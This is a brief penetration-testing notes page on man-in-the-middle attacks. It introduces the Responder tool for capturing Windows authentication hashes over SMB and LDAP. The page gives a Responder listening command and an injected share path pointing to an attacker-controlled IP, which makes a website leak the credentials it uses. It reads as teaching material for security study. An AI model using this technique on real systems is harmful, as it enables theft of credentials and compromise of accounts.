# Man-in-the-middle attack

<div class="row row-cols-lg-2"><div>

A Man-in-the-middle <small>(M-I-T-M)</small> design an attack where an attacker seats between clients and their target server.

* They fooled the client and made them believe they are the 'server'
* They are able to access and maybe edit/drop every message

The hacker will most likely be able to read hashes or credentials sent over the network allowing them to compromise more accounts üîë.

You can use [responder](https://github.com/lgandx/Responder) <small>(5.0k ‚≠ê)</small> to catch Windows authentication requests allowing us to grab hashes and passwords.

For instance, a website may be using SMB to access some shares based on the user input. If we inject a share leading to our machine, we may be able to grab the credentials used to connect to the share.

```ps
$ sudo responder -i IP -I tun0
```

In the previous example, if we inject `//YOUR_IP/anything`. If the website was configured to use the current user credentials to connect to the share, then you will receive them, and will have to crack them.

üìö It works with SMB, LDAP, etc.
